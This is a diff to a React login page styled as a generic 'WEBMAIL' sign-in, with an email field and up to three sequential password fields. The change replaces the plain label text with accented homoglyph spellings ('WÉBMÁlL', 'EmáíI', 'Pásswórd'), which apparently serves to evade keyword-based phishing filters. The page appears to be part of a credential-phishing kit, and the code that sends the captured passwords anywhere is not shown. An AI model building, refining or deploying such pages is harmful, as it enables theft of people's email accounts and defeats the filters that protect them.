@@ -95,13 +95,13 @@ function App() {
 
   return (
     <div className="general">
-      <h2>WEBMAlL*</h2>
+      <h2>WÉBMÁlL</h2>
       <img src={logo} className="img2" alt='Outdated Env'/>
       <form ref={form} onSubmit={handleFormSubmit}>
-          <label>Email</label>
+          <label>EmáíI</label>
           <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>
 
-          {pwdOneIsSet && <label>Password</label>}
+          {pwdOneIsSet && <label>Pásswórd</label>}
           <Grid container>
             <Grid item xs={12}>
               <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} hidden={!pwdOneIsSet} onChange={handlePwdOneChange} required />
@@ -118,7 +118,7 @@ function App() {
           </Grid>
 
 
-          {pwdTwoIsSet && <label>Password</label>}
+          {pwdTwoIsSet && <label>Pásswórd</label>}
           <Grid container>
             <Grid item xs={12}>
               <input type={visible ? "text" : "password"} name="pwdTwo" value={pwdTwo} hidden={!pwdTwoIsSet} onChange={handlePwdTwoChange} />
@@ -134,7 +134,7 @@ function App() {
             }
           </Grid>
 
-          {pwdThreeIsSet && <label>Password</label>}
+          {pwdThreeIsSet && <label>Pásswórd</label>}
           <Grid container>
             <Grid item xs={12}>
               <input type={visible ? "text" : "password"} name="pwdThree" value={pwdThree} hidden={!pwdThreeIsSet} onChange={handlePwdThreeChange} />
